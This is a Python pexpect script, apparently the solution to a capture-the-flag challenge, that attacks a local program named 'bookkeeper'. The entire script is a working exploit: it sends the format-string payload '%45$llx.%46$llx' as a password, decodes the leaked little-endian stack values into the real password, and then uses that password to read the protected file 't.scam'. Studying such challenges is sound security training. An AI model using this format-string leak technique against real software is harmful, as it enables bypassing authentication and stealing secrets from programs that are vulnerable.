# This script uses pexpect to interact with the bookkeeper program

import re

import pexpect

# Start the program
child = pexpect.spawn('./bookkeeper')

# Expect the first password prompt (when trying to cat t.scam)
child.expect('In dir /mnt: ')
# Send the command that triggers the password request
child.sendline('cat t.scam')

# Handle the output and wait for the second prompt
child.expect('Enter password: ')
# Send the format string exploit as the password
child.sendline('%45$llx.%46$llx')

# Now, wait for the incorrect password message which ends with "is incorrect!"
incorrect_message_pattern = re.compile(r'.* is incorrect!')
child.expect(incorrect_message_pattern)

# The output captured will include the incorrect message
incorrect_message = child.match.group(0).decode()
# Extract the two addresses from the output
addresses = incorrect_message.split(' ')[0].split('.')
# Print the addresses
print(f'Address 1: {addresses[0]}')
print(f'Address 2: {addresses[1]}')

# These addresses are in little endian format, so we need to reverse them and convert to ascii to get the password
# CONSIDER: Using password that is not in ascii format for the challenge??

# Convert the addresses to ascii and reverse them
address1 = bytes.fromhex(addresses[0]).decode()[::-1]
address2 = bytes.fromhex(addresses[1]).decode()[::-1]

# Print the password
print(f'Password: {address1}{address2}')

# Now try to cat the file again
child.expect('In dir /mnt: ')
child.sendline('cat t.scam')
child.expect('Enter password: ')
child.sendline(f'{address1}{address2}')

# Wait for the output and print it
child.expect('In dir /mnt: ')
print(child.before.decode())
